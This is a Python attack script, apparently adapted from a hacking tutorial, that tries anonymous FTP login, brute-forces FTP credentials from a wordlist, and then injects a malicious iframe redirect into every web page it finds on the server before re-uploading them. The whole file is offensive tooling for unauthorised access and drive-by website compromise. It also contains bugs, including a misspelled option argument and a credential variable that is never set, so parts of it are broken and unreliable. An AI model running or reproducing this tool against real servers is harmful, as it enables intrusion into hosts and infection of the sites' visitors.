#<--*--coding:utf-8--*-->
import ftplib, optparse, time

ANONYMOUS = 'Anonymous'
ANONYMOUS_EMAIL = 'vme@your.com'

def anonLogin(hostname):
    '''
    Check whether anonymous logon is allowed. FTP
    '''
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'vme@your.com')
        print('[*] '+str(hostname) + ' FTP Anonymous Logon Successed.')
        ftp.quit()
        return True
    except:
        print('[*] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
        return False

def bruteLogin(hostname, passwdFile):
    '''
    Brute force crack FTP code
    '''
    with open(passwdFile, 'r') as pF:
        for line in pF.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')
            print('[+] Trying: ' + username + '/'+password)
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print('[+] '+str(hostname) + ' FTP Logon Seccessed: ' + username + '/'+password)
                ftp.quit()
                return (username, password)
            except:
                pass
    print('[-] Could not brute force FTP credentials.')
    return (None, None)

def returnDefault(ftp):
    '''
    Check that the server provides the web service
    '''
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
        retList.append(fileName)
    return retList

def injectPage(ftp, page, redirect):
    '''
    1、Download the web page from the attack server.
    2、Insert attack code.
    3、Replace the web page on the server.
    '''
    with open(page + '.tmp', 'w') as f:
        ftp.retrlines('RETR ' + page, f.write)
        print('[+] Downloaded Page: ' + page)
        f.write(redirect)
    print('[+] Injected Malicious IFrame on: '+page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)

def attack(username, password, tgtHost, redirect):
    '''
    Integration attack
    '''
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    parse = optparse.OptionParser('usage%prog '+'-H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parse.add_option('-H', dest='tgtHosts', tpe='string', help='specif target host')
    parse.add_option('-f', dest='passwdFile', type='string', help='specify /user/password file')
    parse.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
    (options, args) = parse.parse_args()
    tgtHosts = str(options.tgtHosts).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts == None or redirect == None:
        print(parse.usage)
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost):
            username = 'anonymous'
            password = 'vme@your.com'
            print('[+] Using Anonymous Creds to attack.')
            attack(username, password, tgtHost, redirect)
        elif passwdFile:
            (username, passwdFile) = bruteLogin(tgtHost, passwdFile)
            if password:
                print('[+] Using Creds: %s/%s to attak.'%(username, password))
                attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
    main()